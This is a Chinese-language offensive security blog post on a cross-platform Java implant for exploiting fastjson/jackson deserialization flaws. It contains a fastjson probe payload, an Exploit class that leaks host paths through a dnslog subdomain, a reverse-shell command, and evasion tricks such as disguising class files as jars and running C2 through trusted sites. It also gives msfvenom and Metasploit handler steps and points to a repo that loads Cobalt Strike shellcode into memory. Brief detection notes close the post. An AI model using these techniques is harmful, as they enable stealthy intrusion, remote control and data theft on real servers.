[TOC]

## 牌桌

攻和防的挑战和应战是安全团队兴衰的核心力量，一个组织如果可成功应对挑战，那么技术能力就会提升起来，否则组织就会走向衰落和解体。Azimuth、Vupen这类创业公司的兴起代表着现有的复杂局势在于专业化的混合手段攻击、自动攻击、工具链集成化。笔者注意到奇安信方面最近也提到了四化：对手组织化、环境云化、目标数据化和防护实战化。

1. 对手组织化，就是对手从普通的网络犯罪变成了组织化的攻击，攻击方式从通用攻击转向了专门定向攻击；
2. 环境云化，新一代信息技术的全面应用，带来了信息化和信息系统的云化，典型特征是终端智能、应用系统、IT设施的全面云化；
3. 目标数据化，新一代信息化建设以数据共享为基础，“数据”在经济社会中的价值越来越高，数据和业务应用成为网络攻击的重要目标；
4. 防护实战化，面对新的安全形势和安全环境，安全防护体系建设从合规导向转向能力导向，网络安全防护和监管都转向关注实战化，实网攻防演习成为常态化手段。

这个趋势很准确，安全工作的得分要求立足于APT才好，想着目标只是防护SRC的白帽子小朋友就是设立的标准太低，别整天盯着国内互联网的朋友圈。创造就是欢乐，本文提出了一种兼容反序列漏洞利用后期阶段的跨平台多协议前锋马。：）

## 整牌

> 要冷静—绝不要动作快—停下来想一想-这里执行渗透攻击的规则。如果件件遵守，就绝不会出乱子。


回想下遇到反序列化漏洞时的日常操作：首先通过java的InetAddress判断是否是fastjson或jackson踩点。

```java
{"@type":"java.net.InetAddress","val":"g.cn"}
```

确认后打POC，根据返回的java UA显示精心选择与服务器端JDK版本一致的class，通过RMI或者LDAP协议适配Exploit.class，首先回显dnslog返回确认是否利于成功，

```java
public Exploit() throws Exception {

    StringBuffer sb = new StringBuffer(new File(".").getCanonicalPath());
    sb.append(System.getenv("JAVA_HOME"));
    String pwd = new BASE64Encoder().encode(sb.toString().getBytes());
    pwd = pwd.replaceAll("\\n", "");
    String domain = pwd + ".x1382.ceye.io";
    try {
        InetAddress ip = InetAddress.getByName(domain);
    } catch (UnknownHostException e) {
       // e.printStackTrace();
    }

}
```

确认存在漏洞执行第二遍POC，在win平台使用下powershell、dnscat2、regsvr32，linux下awk、管道、重定向等反弹shell方法获取权限。

```java
public Exploit() throws Exception {
    try {
        Runtime r = Runtime.getRuntime();
       // Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/port 0>&1"});
        Process p = r.exec(new String[]{"open","/Applications/Calculator.app/"});
        p.waitFor();
    } catch (IOException e) {
        e.printStackTrace();
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
}
```

### 反序列化类技术利用不足

* NIDS：通过流量分析RMI、LDAP等协议，阻断请求；dns搜集ceye等其他已知的dnslog平台。拦截对外发出的直连socket请求。
* HIDS：查看java进程进行是否绑定/bin/bash shell；通过分析bash执行内容，感知是否是攻击性异常命令。
* 蜜罐：伪装bash，记录行为，捕获攻击者的具体行为和vps主机ip对应提交到到威胁情报。
* 目标应用程序版本发布升级会使得挂载的.class恶意脚本失效。
* 利用过程的条件
  * RMI、ldap加载的问题在于java 8u121的trustURLCodebase默认关闭。
  * 如果需要多次执行命令，需要更改Exploit里shell命令，再次触发利用多次fastjson等反序列化漏洞，利用成功时日志会有JSONException: set property error, autoCommit，会暴露攻击时间线，
  * shell命令如which、ps -aux等命令容易被监控或替换。
* RASP：查看是否是反序列自动化工具生成的POC来执行的命令，如下面的图表所示。


```java
if (method.startsWith('ysoserial.Pwner')) {
    message = _("Reflected command execution - Using YsoSerial tool")
    break
}
```

rasp也支持拦截对外访问地址。

```java
'.ceye.io','.vcap.me','.xip.name','.xip.io', 'sslip.io','.nip.io', '.burpcollaborator.net', '.tu4.org'
```

### 思路

#### 从http 协议入手

通过rmi、ldap后，可以从其他服务器上加载 class 文件来进行实例化，现在网络上的server端都是要求下载class文件，这里文件特征很明显的以字节码cafebabe开头。解决办法通过将该class通过maven打包为jar文件，然后变更jar文件的后缀即可。或者通过file:////、raw协议直接加载载荷，避免网络端日志的发现。

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {

    ClassLoader parent = getContextClassLoader();
    ClassLoader cl =
             URLClassLoader.newInstance(getUrlArray(codebase), parent);

    return loadClass(className, cl);
}
```

URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源核心变更步骤为：修改LdapServer的codebase启用参数为：

```shell
java LdapServer https://g.cn/2.jpg#Exploit 389
```

其中https://g.cn/2.jpg表示将class打包为jar后伪装的名字，Exploit为该jar里执行payload的类名。这样将RMI、LDAP从远端下载变得更隐蔽了些。

#### defineClass种马

早期支持classloader的版本，将恶意class文件进行bcel编码，然后通过defineClass直接加载是个好办法，反序列化不只是rce，还有任何java代码执行的功能，具体的单Class功能实现考虑几种协议和文件实现。

1. http隧道

   直接通过deniclass一键种马,安卓的Dalvik(s) JIT 可以用来直接加载shellcode一样，

2. 其他c2地址

   采用的C2地址来自于为微软、aws和oracle官方站点，服务端升级、变更、撤离和定制上报内容时不是很方便，需要改进自己实现https的服务器端，通过Microsoft、Oracle站点的ssrf调用cloudflare的CDN联系后端远控下发命令。

3. icmp隧道

   java提供对raw socket的很有限的支持，要想实现icmp需要jpcap或者RockSaw Raw Socket Library，目前没有实现这样的工具，读者可以考虑通过调用其他jni工具实现。

4. dns隧道

   dnslog是最简单直接的利用方法，相关的姿势不再重复。

5. smtp

   其实smtp是个好办法，获取内部的zimbra或者exchange一个，走smtp协议附件转发，既可以进行文件传输，也不用担心心跳特征，网络也在IDC区域。当然首先你需要有邮箱账户。

## 发牌

1. 切入点是Exploit.class的具体实现不再是rmi、ldap，而是直接加载class文件；
2. 反序列化时手法精巧，避免报错显示；
3. 避免反弹shell，而在这一步直接植入木马到内存中，原生JAVA编码实现攻击者远控下发，victim执行的操作；
4. 通信隧道方面走https到可信的c2服务器站点，icmp协议、dns协议

**最终实现无文件残留，无敏感特征，通信双向加密。**

如何达到这一点目标？

笔者在这里实现了通过编码shell code，结合bcel在反序列化时种马的办法。

https://github.com/nanolikeyou/R9000.git  git项目下有几个java文件，分别用来： 

MSFPayload.java:远程触发加载msf生成的远控meterpreter；CobaltStrike.java；记载cs和msf生成的shellcode到内存中，BCELEncode.java，将MSFPayload或CobaltStrike的class文件进行bcel编码，方便构造反序列化poc。

如何不需要使用bcel的方式，直接将生成的MSFPayload.class或者CobaltStrike.class作为rmi、ldap托管的JNDI类也可。

## 出牌：

> talk is cheap,show me the code

### MSFPayload的使用办法

首先使用进入msfconsole，生成msf payload，提取 metasploit.dat里的远程地址，形如URL=https://8.8.8.8:443/7UPg239jNUwQgAEIKIRr45vljLb3wVQshFSxIEqz8aprtR_32bn7crmons7R3ihHKIPxbUlXUaqJmKQzPJvIyHR

```shell
msfvenom -p java/meterpreter/reverse_https LHOST=8.8 LPORT=4446 -f raw > https.jar

jar -xvf https.jar && tail metasploit.dat
```
服务器端进行监听
```shell
use exploits/multi/handler
set PAYLOAD java/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
exploit
```

![image-20190808193921016](http://ww4.sinaimg.cn/large/006tNc79ly1g5si84hn9hj31ni0nqdk8.jpg)

填入MSFPayload，通过BCELEncode进行编码，打入反序列化poc，msf端获取shell。

### CobaltStrike的使用方法

启动cs，使用attacks->packages->payload generator,生成java的shellcode，也支持填入msf生成的java类型的shellcode。

![image-20190808195201906](http://ww2.sinaimg.cn/large/006tNc79ly1g5sjdfncmfj311y0g4wgq.jpg)

![image-20190808195413095](http://ww2.sinaimg.cn/large/006tNc79ly1g5sin0s5nmj31by0c277b.jpg)

填入CobaltStrike，通过BCELEncode进行编码，打入反序列化poc，cs获取shell。

#### 不足之处

今年3月份OceanLotus (APT32)的工具JEShell实现了从内存加载的CobaltStrike的shellcode，可能是基于DEP的考虑，但是也给了我很大的启发。读者可能阅读到下面的代码使用jna技术加载的shellcode

```
static Kernel32 kernel32 = (Kernel32) Native.loadLibrary( Kernel32.class, W32APIOptions.UNICODE_OPTIONS );
```



因为很遗憾java和c的结合很难，本shellcode加载技术只适用于win32环境，而且需要目标环境下有jna这个jar包。也许安卓方面Dalvik的jit技术可以用在这里。另外可以将这些需要的jar和dll以字节流的方式记载，然后在服务器端释放，但是太不稳定了。

## 收牌

如何防护上面的攻击？不妨看下msf原理的实现。

msf支持这些方法

1. java/jsp_shell_bind_tcp    

2. java/jsp_shell_reverse_tcp

3. java/meterpreter/bind_tcp

4. java/meterpreter/reverse_http 

5. java/meterpreter/reverse_https

6. java/meterpreter/reverse_tcp  

7. java/shell/bind_tcp           

8. java/shell/reverse_tcp 

9. java/shell_reverse_tcp

几个直接sokcet实现的反弹shell的关联动静太大，不在分析的范围内。

那么以生成http.jar的载荷为例，靶机首先运行ava -jar http.jar作为下载器，实现内容为将自身添加到临时文件目录，从指定端口下载真实载荷文件

/Library/Java/JavaVirtualMachines/jdk1.8.0_162.jdk/Contents/Home/jre/bin/java -classpath /var/folders/1v/w11kfzss32578s936h30vdyr0000gn/T/~spawn7115543174041637947.tmp.dir metasploit.Payload

![image-20190805004106503](http://ww1.sinaimg.cn/large/006tNc79ly1g5sjddhce4j31sg0lctfw.jpg)

然后执行下载下来的真实class javapayload.stage.Meterpreter进行bootstrap，销毁源tmp文件，class以0000 00d3 cafe babe 开头（注意到这又是一个唯一特征）。这一步远程加载datastream， msf真实的payload开始执行，实现无文件内存存留。

心跳特征

![image-20190805004012139](http://ww4.sinaimg.cn/large/006tNc79ly1g5sjdbb0ssj30u00yje27.jpg)

com.metasploit.meterpreter.Meterpreter

心跳存活和下发命令通过post上传加密之后的内容，心跳地址固定，返回无回显。get地址为心跳，如果需要下发命令，则心跳地址返回内容包括需要下发的命令，然后通过post往该地址上报结果内容。

 下面三个请求分别为一般心跳、下发命令，上报执行命令的回显。

```
GET /PChqVu5ecM04Fj222Ge1IEoebvxJdmRcVWyrLa/ HTTP/1.1
User-Agent: Java/1.8.0_162
Host: 3351:4445
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 0

GET /PChqVu5ecM022vxJdmRcVWyrLa/ HTTP/1.1
User-Agent: Java/1.8.0_162
Host: 33151:4445
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

HTTP/1.1 200 OK
Content-Type: application/octet-stream
Connection: Keep-Alive
Server: Apache
Content-Length: 114

[:X....$.........`9.[:X.[:X.[:X.[:X.[;X.(N<.+S.."I..)U;.(I..>N..)U;.(I=.[:X.r:Y.Y
i.c	a.n.l.o.k.l.j.m.i.b.j.j.h.m:POST /PChqVu5ecM04FjwH33339uUXqqrVOPEZLGe1IEoebvxJdmRcVWyrLa/ HTTP/1.1
User-Agent: Java/1.8.0_162
Host: 331:4445
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 145038

=....P..gQ....-7....=...=..m=...=..2=...N..zM..hD..kO..~N..|X..kO..~N..h=.......?..+...-....	..-
......-...#...+....=...=...=...=...<;.3W..EM;.
...K....=...5	..=...5
..=...=...9..tR...=...<..4N..u...nS...=...+......yT..w\..xU...=..[=...=...?...=...=...<..iR...=...=......i...rS..bN..|Y...=...5..nN..h_..4N..wR...=..i}...=...=...=..1=...=..	O..o=........
```
显然从ua、包内容的明显黑名单字段、http出口的黑白名单方面抓特征还是很容易上规则的。

至于反序列化等防护手段，根据企业的推行力度和运营手段斟酌吧。

## 最后

如何您有更好的实现和思路，欢迎同我留言交流。